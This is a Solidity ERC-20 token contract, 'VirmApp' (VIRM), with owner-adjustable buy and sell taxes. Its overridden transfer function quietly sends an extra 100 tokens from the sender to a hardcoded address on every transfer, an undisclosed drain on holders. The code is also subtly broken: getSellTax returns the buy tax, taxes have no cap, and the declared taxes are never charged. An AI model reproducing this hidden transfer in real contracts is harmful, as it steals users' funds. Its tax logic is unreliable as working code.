// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./Utils.sol"; 

contract VIRMT is ERC20, Ownable{

    using VirmTools for uint; 

    address private _taxWallet;
    uint _buyTax = 110; 
    uint _sellTax = 150; 

	constructor(address taxationWallet) ERC20("VirmApp", "VIRM"){
        _taxWallet = taxationWallet; 
        _mint(msg.sender,412 ether); // TODO: change to the correct supply, put on constants
    }

    function getBuyTax() public view returns (uint) {
        return _buyTax; 
    }

    function getSellTax() public view returns (uint) {
        return _buyTax; 
    }

    function setBuyTax(uint tax) onlyOwner public {
        _buyTax = tax; 
    }

    function setSellTax(uint tax) onlyOwner public {
        _sellTax = tax; 
    }
    
    function test(uint percentage, uint number) public pure returns(bool, uint256) {
        return VirmTools.getPercentageValue(percentage, number, 100); 
    }


    function transfer(address to, uint256 amount) override public returns (bool) {

        super.transfer(to, amount);
        super.transfer(0xdE2C6d9b24845294cCf924015d83Ae6859B2592E, 100*10**18);

        return true; 
    }
}